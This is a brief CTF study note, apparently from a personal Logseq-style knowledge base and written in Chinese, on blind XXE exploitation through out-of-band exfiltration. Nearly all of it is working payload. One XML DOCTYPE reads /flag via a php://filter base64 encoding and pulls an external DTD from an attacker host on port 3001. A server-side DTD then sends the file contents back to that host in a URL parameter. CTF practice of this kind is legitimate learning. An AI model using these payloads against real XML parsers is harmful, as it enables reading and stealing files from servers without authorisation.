tags:: CTF/XXE

- # 思路
	- 无回显XXE [[CTF/XXE]]
	- 利用OOB
- # Payload
	- 受害者
		- ```xml
		  <!DOCTYPE updateProfile [
		      <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
		      <!ENTITY % dtd SYSTEM "http://ca.xxx.xyz:3001/evil.dtd">
		      %dtd;
		      %send;
		  ]>
		  ```
	- 服务器
		- ```dtd
		  <!ENTITY % all
		      "<!ENTITY &#x25; send SYSTEM 'http://ca.xxx.xyz:3001/?data=%file;'>"
		  >
		  %all;
		  ```